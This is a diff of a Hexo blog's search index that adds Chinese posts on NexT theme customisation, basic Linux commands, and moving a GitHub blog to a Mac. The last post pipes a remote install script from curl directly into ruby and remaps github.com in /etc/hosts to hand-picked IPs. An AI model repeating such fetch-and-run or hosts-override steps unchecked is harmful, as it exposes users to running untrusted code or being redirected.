class="comment">#YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line">  <span class="attr">Instagram:</span> <span class="string">https://instagram.com/xinkjung</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>    <span class="comment"># 是否显示社交图标</span></span><br><span class="line">  <span class="attr">icons_only:</span> <span class="literal">false</span>    <span class="comment"># 是否只显示社交图标</span></span><br><span class="line">  <span class="attr">transition:</span> <span class="literal">false</span>    </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sidebar.png" alt="侧栏效果预览"></p>
+<h3 id="开启打赏功能"><a href="#开启打赏功能" class="headerlink" title="开启打赏功能"></a>开启打赏功能</h3><p>越来越多的平台（微信公众平台，新浪微博，简书，百度打赏等）支持打赏功能，付费阅读时代越来越近，特此增加了打赏功能，支持微信打赏和支付宝打赏。 只需要 <span class="label success">主题配置文件</span> 中填入 <code>微信</code> 和 <code>支付宝</code> 收款二维码图片地址即可开启该功能:</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment">#false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">comment:</span> <span class="string">请我喝杯奶茶吧～</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">wechatpay:</span> <span class="string">/images/wechatpay.png</span></span><br><span class="line">  <span class="attr">alipay:</span> <span class="string">/images/alipay.png</span></span><br><span class="line">  <span class="comment">#paypal: /images/paypal.png</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/reward.png" alt="打赏效果预览"></p>
+<h3 id="设置底部布局"><a href="#设置底部布局" class="headerlink" title="设置底部布局"></a>设置底部布局</h3><p>站点建立时间可以在站点的底部显示，例如 © 2013 - 2015。 编辑 <span class="label success">主题配置文件</span>，修改字段 <code>since</code> 内容，同时文章底部的布局也都可以在 <code>footer</code> 字段下进行设置：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2018</span></span><br><span class="line">  <span class="attr">icon:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">fa</span> <span class="string">fa-heart</span></span><br><span class="line">    <span class="attr">animated:</span> <span class="literal">false</span>   <span class="comment"># 图标是否闪烁</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">&quot;#D3D3D3&quot;</span>   <span class="comment"># 图标颜色，这里是亮灰色</span></span><br><span class="line">  <span class="attr">copyright:</span>    <span class="comment"># 如果不设置，将会默认显示站点作者名称</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">false</span>  <span class="comment"># true  # 是否显示 Powered by Hexo &amp; NexT</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/footer.png" alt="底部效果预览"></p>
+<h2 id="进阶设置"><a href="#进阶设置" class="headerlink" title="进阶设置"></a>进阶设置</h2><p>进行了一些基础配置之后感觉还不是很完美，于是又有了下面这些进阶设置。</p>
+<h3 id="自定义网站图标"><a href="#自定义网站图标" class="headerlink" title="自定义网站图标"></a>自定义网站图标</h3><p>博客的默认图标是 <code>N</code> ，不过 NexT 支持修改图标，博客网站的图标可以在 <a href="https://www.iconfont.cn/">iconfont</a> 网站选择，然后选择或者创建相应大小的图标文件，放置在 <code>themes/next/sources/images</code> 目录下，并在 <span class="label success">主题配置文件</span> 中进行如下配置（只需要设置 <code>small</code> 和 <code>medium</code> 两个就可以）：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/16x16.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/32x32.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/128x128.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/star.svg</span></span><br><span class="line">  <span class="comment">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="comment">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/icon.png" alt="图标效果预览"></p>
+<h3 id="添加数据统计"><a href="#添加数据统计" class="headerlink" title="添加数据统计"></a>添加数据统计</h3><p>不蒜子统计的引入很好的方便了设置阅读次数和访客数，可以在 <span class="label success">主题配置文件</span> 中进行如下设置：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>     <span class="comment"># false，是否开启不蒜子统计功能</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">false</span>     <span class="comment"># true，是否开启总访客数统计   </span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">false</span>      <span class="comment"># true，是否开启总访问量统计</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span>      <span class="comment"># 是否开启文章阅读量统计</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/postview.png" alt="文章阅读量效果预览"></p>
+<h3 id="修改标签样式"><a href="#修改标签样式" class="headerlink" title="修改标签样式"></a>修改标签样式</h3><p>对于博客文章底部的标签样式默认为 <code>#tag</code> ，我们可以将其改成标签图标样式，打开模板 <code>themes/next/layout/_macro/post.swig</code> ，搜索 <code>rel=&quot;tag&quot;&gt;#</code> ，将 <code>#</code> 换成 <code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code> 就可以了：</p>
+<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/post.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;post-tags&quot;&gt;</span><br><span class="line">    &#123;%- for tag in post.tags.toArray() %&#125;</span><br><span class="line">        &lt;a href=&quot;&#123;&#123; url_for(tag.path) &#125;&#125;&quot; rel=&quot;tag&quot;&gt; &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; &#123;&#123; tag.name &#125;&#125;&lt;/a&gt; </span><br><span class="line">    &#123;%- endfor %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/label.png" alt="标签效果预览"></p>
+<h3 id="修改链接样式"><a href="#修改链接样式" class="headerlink" title="修改链接样式"></a>修改链接样式</h3><p>文章中的超链接样式也是可以通过文件来修改的，在 <code>themes/next/source/css/_common/components/post/post.styl</code> 文件末尾添加如下css样式：</p>
+<figure class="highlight styl"><figcaption><span>themes/next/source/css/_common/components/post/post.styl</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文章内链接文本样式</span></span><br><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> a&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="selector-pseudo">&amp;:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/link1.png" alt="链接效果预览"> <img src="/images/link2.png" alt="链接效果预览"></p>
+<h3 id="文章目录设置"><a href="#文章目录设置" class="headerlink" title="文章目录设置"></a>文章目录设置</h3><p>可以在 <span class="label success">主题配置文件</span> 中设置文章目录不自动生成并显示数字（可以自己添加）：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Automatically add list number to toc.</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">false</span>   <span class="comment"># true</span></span><br></pre></td></tr></table></figure>
+
+<div class="note info">
+            <p><i class="fa fa-info-circle"></i> 写文章时标题跨级否则取消自动生成数字标号后显示会错乱（一级标题后必须跟二级标题，二级标题后必须跟三级标题，以此类推）</p>
+          </div>
+
+<h3 id="添加文章结束标志"><a href="#添加文章结束标志" class="headerlink" title="添加文章结束标志"></a>添加文章结束标志</h3><p>为了使得文章页面更美观，还可以为其设置一个文章结束标志，以此为分界线。在路径 <code>themes/next/layout/_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件，并添加以下内容：</p>
+<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/passage-end-tag.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;------------- &lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt; 本文结束感谢您的阅读 &lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt; -------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p>接着打开 <code>themes/next/layout/_macro/post.swig</code> 文件，在 <code>post-body</code> 之后( <code>END POST BODY</code> )， <code>post-footer</code> 之前添加如下代码：</p>
+<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/post.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include &#x27;passage-end-tag.swig&#x27; %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后打开 <span class="label success">主题配置文件</span> 在末尾添加：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/thanksline.png" alt="结束标志效果预览"></p>
+<h3 id="添加文章版权信息"><a href="#添加文章版权信息" class="headerlink" title="添加文章版权信息"></a>添加文章版权信息</h3><p>很多人是自己手动写入的文件来添加文章版权信息，为了方便也可以直接在 <span class="label success">主题配置文件</span> 中开启博客的版权功能：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span>    <span class="comment"># true，侧边栏显示版权©️</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/copyright.png" alt="版权信息效果预览"></p>
+<h3 id="添加图片放大功能"><a href="#添加图片放大功能" class="headerlink" title="添加图片放大功能"></a>添加图片放大功能</h3><p>针对文章中的图片可能看不清的情况，可以在 <span class="label success">主题配置文件</span> 中找到 <code>fancybox</code> 字段并更改参数：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span>   <span class="comment"># false</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="开启本地搜索功能"><a href="#开启本地搜索功能" class="headerlink" title="开启本地搜索功能"></a>开启本地搜索功能</h3><p>该功能由 <code>hexo-generator-searchdb</code> 提供，效果如下图：</p>
+<p><img src="/images/search.png" alt="本地搜索效果预览"><br>首先需要在根目录下执行以下命令来安装相关依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
+
+<p>然后在 <span class="label success">主题配置文件</span> 中修改相关 <code>local_search</code> 字段：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>    <span class="comment"># false</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span>    <span class="comment"># 每次输入改变都执行搜索</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">3</span>    <span class="comment"># 1， 每篇文章显示的搜索结果数量，如果要显示所有结果可设置为-1</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<p>在 <span class="label warning">站点配置文件</span> 中添加以下字段：</p>
+<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span> <span class="comment"># 指定搜索范围，可选 post | page | all</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span> <span class="comment"># 指定页面内容形式，可选 html | raw (Markdown) | excerpt | more</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h4> 参考链接 </h4>
+
+<ol>
+<li><a href="http://theme-next.iissnan.com/getting-started.html">NexT 使用文档</a></li>
+<li><a href="https://blog.csdn.net/nightmare_dimple/article/details/86661502?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.control">Hexo 博客优化之Next 主题美化 - CSDN博客</a></li>
+<li><a href="https://blog.csdn.net/qq_39085060/article/details/103831291">Hexo next 主题博客搭建及美化 - CSDN博客</a></li>
+<li><a href="http://yearito.cn/posts/hexo-advanced-settings.html">Hexo 搭建个人博客系列：进阶设置篇 - Yearito’s Blog</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>Blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux命令合集</title>
+    <url>/2022/03/14/Linux%E5%91%BD%E4%BB%A4%E5%90%88%E9%9B%86/</url>
+    <content><![CDATA[<h3 id="一、Linux-命令行切换路径"><a href="#一、Linux-命令行切换路径" class="headerlink" title="一、Linux 命令行切换路径"></a>一、Linux 命令行切换路径</h3><h4 id="1-切换目录"><a href="#1-切换目录" class="headerlink" title="1. 切换目录"></a>1. 切换目录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入用户主目录</span><br><span class="line">cd ~</span><br><span class="line"># 返回进入此目录之前所在目录</span><br><span class="line">cd - </span><br><span class="line"># 返回上级目录(若为根目录则显示/,切换后无变化）</span><br><span class="line">cd ..</span><br><span class="line"># 返回上两级目录</span><br><span class="line">cd ../..</span><br></pre></td></tr></table></figure>
+<h4 id="2-显示当前路径"><a href="#2-显示当前路径" class="headerlink" title="2. 显示当前路径"></a>2. 显示当前路径</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 以绝对路径的方式显示用户当前工作目录</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
+<h4 id="3-显示路径下目录列表"><a href="#3-显示路径下目录列表" class="headerlink" title="3. 显示路径下目录列表"></a>3. 显示路径下目录列表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 显示当前目录下非隐藏文件列表</span><br><span class="line">ls</span><br><span class="line"># 显示当前目录下所有文件列表（.开头的即为隐藏文件）</span><br><span class="line">ls -a</span><br><span class="line"># 显示并输出为长格式列表</span><br><span class="line">ls -l</span><br><span class="line"># 以长格式列表排列显示文件大小日期等</span><br><span class="line">ls -lh</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="二、Linux-命令行复制-移动文件-夹"><a href="#二、Linux-命令行复制-移动文件-夹" class="headerlink" title="二、Linux 命令行复制/移动文件(夹)"></a>二、Linux 命令行复制/移动文件(夹)</h3><h4 id="1-复制单个文件到另一个文件夹"><a href="#1-复制单个文件到另一个文件夹" class="headerlink" title="1. 复制单个文件到另一个文件夹"></a>1. 复制单个文件到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">cp A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>例如复制 <code>A.html</code> 或者 <code>B.jpg</code> 或者 <code>C.word</code> 或 <code>D.zip</code> 或者 <code>E空文件夹</code> 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /var/www/xin/A.html /usr/xxx/ </span><br></pre></td></tr></table></figure>
+<h4 id="2-复制文件夹到另一个文件夹"><a href="#2-复制文件夹到另一个文件夹" class="headerlink" title="2. 复制文件夹到另一个文件夹"></a>2. 复制文件夹到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">cp -r A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>例如复制 <code>xin</code> 文件夹 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -r /var/www/xin/ /usr/xxx/ </span><br></pre></td></tr></table></figure>
+<h4 id="3-移动文件-夹-到另一个文件夹"><a href="#3-移动文件-夹-到另一个文件夹" class="headerlink" title="3. 移动文件(夹)到另一个文件夹"></a>3. 移动文件(夹)到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">mv A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>例如移动 <code>A.html</code> 或者 <code>B.jpg</code> 或者 <code>C.word</code> 或 <code>D.zip</code> 或者 <code>xin</code> 文件夹 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /var/www/xin/A.html /usr/xxx/ </span><br><span class="line">mv /var/www/xin /usr/xxx</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="三、通过-ssh-拷贝远程-Linux-服务器上文件-夹"><a href="#三、通过-ssh-拷贝远程-Linux-服务器上文件-夹" class="headerlink" title="三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)"></a>三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)</h3><h4 id="1-Mac-拷贝服务器文件到本地"><a href="#1-Mac-拷贝服务器文件到本地" class="headerlink" title="1. Mac 拷贝服务器文件到本地"></a>1. Mac 拷贝服务器文件到本地</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp 用户名@IP地址:A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>比如用户 <code>user</code> 拷贝 <code>xxx.xxx.xxx.xxx</code> 服务器上 <code>data.py</code> 文件夹到本地桌面，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp user@xxx.xxx.xxx.xxx:/home/user/Desktop/data.py /Users/user/Desktop</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-Mac-拷贝本地文件到服务器"><a href="#2-Mac-拷贝本地文件到服务器" class="headerlink" title="2. Mac 拷贝本地文件到服务器"></a>2. Mac 拷贝本地文件到服务器</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp 用户名@IP地址:A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>比如用户 <code>user</code> 拷贝本地文件 <code>a.jpg</code> 到 <code>xxx.xxx.xxx.xxx</code> 服务器上作为 <code>b.jpg</code>，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /Users/xxx/Desktop/a.jpg user@xxx.xxx.xxx.xxx:/home/user/Desktop/Data/b.jpg</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-Mac-拷贝文件夹"><a href="#3-Mac-拷贝文件夹" class="headerlink" title="3. Mac 拷贝文件夹"></a>3. Mac 拷贝文件夹</h4><p>参考以上命令，只需在 <code>scp</code> 后多添加指令参数 <code>–r</code> 即可:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp –r  …</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="四、Linux-命令行查看-编辑文件"><a href="#四、Linux-命令行查看-编辑文件" class="headerlink" title="四、Linux 命令行查看/编辑文件"></a>四、Linux 命令行查看/编辑文件</h3><p>可以使用 <code>vi</code> 或 <code>vim</code> 查看/编辑文件，后跟文件路径(当前路径直接跟文件名)即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /path/to/file</span><br></pre></td></tr></table></figure>
+<p>这时就进入了指令模式，可以看见文件内容（如果文件存在的话，如果此文件不存在，该命令会创建文件）</p>
+<ul>
+<li>处于光标之下的字符使用 <code>x</code> 字符删除（仅限指令模式）</li>
+<li>按 <code>i</code> 就进入了 <code>编辑insert</code> 模式，便可以开始编辑文本了</li>
+<li>按 <code>ESC</code> 退出编辑模式</li>
+<li>如果没做修改退出文本，键入 <code>:q</code>；做了修改但不保存文本退出，键入 <code>:q!</code>；做了修改并保存退出文本，键入 <code>:wq</code> </li>
+</ul>
+<p>vi 和 vim 都是 Linux 中的编辑器，不同的是 vim 比较高级，可以视为 vi 的升级版本，vi 使用于文本编辑，vim 更适用于 coding 。</p>
+]]></content>
+      <categories>
+        <category>x</category>
+      </categories>
+      <tags>
+        <tag>a</tag>
+        <tag>b</tag>
       </tags>
   </entry>
   <entry>
@@ -828,6 +878,79 @@ $ hexo d # == hexo deploy 上传
 ]]></content>
   </entry>
   <entry>
+    <title>Windows转Mac继续管理GitHub博客</title>
+    <url>/2021/08/24/Windows%E8%BD%ACMac%E7%BB%A7%E7%BB%AD%E7%AE%A1%E7%90%86GitHub%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h2 id="变！"><a href="#变！" class="headerlink" title="变！"></a>变！</h2><p>从 Windwos 换了 Mac，怎么在 Mac 上继续使用 git 在 GitHub 上传自己的项目呢？</p>
+<p>解决方案：</p>
+<ol>
+<li>在 Mac 上下载 git 、 node.js 和 hexo</li>
+<li>在 Mac 上 clone 自己的项目到目录</li>
+</ol>
+<blockquote>
+<p>第一步：下载和安装</p>
+</blockquote>
+<p>这里使用 homebrew 进行安装<br>(1) 安装 homebrew</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(2) 下载 git 和 node.js </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install git</span><br><span class="line">brew install node</span><br><span class="line">npm install hexo g </span><br></pre></td></tr></table></figure>
+
+<p>可以使用 <code>git</code> 或 <code>git -verison</code> 命令来验证 git 版本。</p>
+<p>(3) 初始化 hexo 目录</p>
+<p>新建一个 hexo 目录用于存放博客相关文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir bolg</span><br></pre></td></tr></table></figure>
+
+<p>在博客根目录打开终端窗口，对目录进行初始化操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+
+<p>再用 <code>hexo s</code> 测试是否成功，打开 <code>localhost:4000</code> 即可查看本地预览 </p>
+<blockquote>
+<p>第二步： SSH 配置 git</p>
+</blockquote>
+<p>(1) 设置 <code>username</code> 和 <code>email</code> （github每次commit都会记录他们） </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;登录账号名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱账号&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(2) 先查看本地是否已存在 <code>SSH key</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure>
+
+<p>我的新电脑是没有的，直接通过终端命令创建 <code>ssh key</code> ，然后一直回车，输入 <code>用户名 + 密码</code>（ GitHub 登录的），最后会生成一串密钥。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C “邮箱账号&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(3) 登陆 GitHub ，找到 Settings ，点击 SSH AND GPG Keys –&gt; New SSH key ，把刚刚看到的 key 复制粘贴进去，title 随便写</p>
+<figure class="highlight plaintext"><figcaption><span>复制id_rsa.pub</span></figcaption><table><tr><td class="code"><pre><span class="line">cat .ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p>保存后，GitHub 会向邮箱发送一个验证链接，记得要登录邮箱进行验证，不然之后会导致部署不成功</p>
+<p>(4) 验证一下，如果出现 <code>hi +用户名</code> 即为成功 ~</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>第三步: clone 项目 / 文件配置转移</p>
+</blockquote>
+<p>把原来的项目复制下来，可以随便添加点东西去测试是否可以上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git  clone https://wxxxx.git</span><br></pre></td></tr></table></figure>
+
+<p>这里我是直接复制原来 Windows 下的博客根目录 hexo 过来的，然后找到该目录下的：<code>_config.yml</code> 、 <code>scaffolds</code> 、 <code>source</code> 、 <code>themes</code> 这四个文件夹，把它们复制到<br>Mac 下的博客根目录 hexo，直接覆盖替换相同的文件文件夹就可以了。</p>
+<h2 id="problems-？"><a href="#problems-？" class="headerlink" title="problems ？"></a>problems ？</h2><h3 id="Mac-终端-shell-类型切换方法"><a href="#Mac-终端-shell-类型切换方法" class="headerlink" title="Mac 终端 shell 类型切换方法"></a>Mac 终端 shell 类型切换方法</h3><p>可以执行命令 <code>echo $SHELL</code>，先查看终端类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: /bin/bash</span><br><span class="line">zsh: /bin/zsh</span><br></pre></td></tr></table></figure>
+
+<p>切换到bash，输入命令：<br><code>chsh -s /bin/bash</code></p>
+<p>切换到zsh，输入命令：<br><code>chsh -s /bin/zsh</code></p>
+<p>ps: 注意需要重启终端生效（强制退出后再打开）</p>
+<h3 id="GitHub-网站打不开或访问慢怎么解决"><a href="#GitHub-网站打不开或访问慢怎么解决" class="headerlink" title="GitHub 网站打不开或访问慢怎么解决"></a>GitHub 网站打不开或访问慢怎么解决</h3><p>查询 <code>github.com</code> 的有效IP，可以使用<a href="http://tool.chinaz.com/dns">站长工具</a><br>然后将查询到的 IP 地址复制到自己的 <code>hosts</code> 文件里即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Host Database</span><br><span class="line"># localhost is used to configure the loopback interface</span><br><span class="line"># when the system is booting.  Do not change this entry.</span><br><span class="line">##</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">255.255.255.255	broadcasthost</span><br><span class="line">::1             localhost</span><br><span class="line">203.208.39.104 github.com</span><br><span class="line">13.114.40.48 github.com</span><br><span class="line">52.69.186.44 github.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mac如何编辑-hosts-系统文件"><a href="#Mac如何编辑-hosts-系统文件" class="headerlink" title="Mac如何编辑 hosts 系统文件"></a>Mac如何编辑 hosts 系统文件</h3><p><code>前往 -&gt; 前往文件夹 -&gt; （输入）/etc/hosts</code> ，回车找到 <code>hosts</code> 文件，然后打开对其进行编辑会提示没有权限并询问是否复制，点击复制按钮，然后在新的窗口里可以编辑文件，编辑完成后保存窗口显示文件名是未命名的 <code>hosts副本.txt</code> ，我们将名称改为 <code>hosts</code> (记得去除后缀名txt)，然后保存并替换原来的 <code>hosts</code> 文件。</p>
+<h3 id="Mac-的-ssh-文件在哪里"><a href="#Mac-的-ssh-文件在哪里" class="headerlink" title="Mac 的 .ssh 文件在哪里"></a>Mac 的 .ssh 文件在哪里</h3><p>鼠标点击一下桌面回到 🍎 菜单栏， <code>前往 -&gt; 前往文件夹 -&gt; （输入） ~/.ssh</code> 回车即可。<br>即：shift+command+G -&gt; 输入 ~/.ssh</p>
+]]></content>
+      <categories>
+        <category>配置</category>
+      </categories>
+      <tags>
+        <tag>Blog</tag>
+        <tag>Mac</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>侧信道攻击技术学习</title>
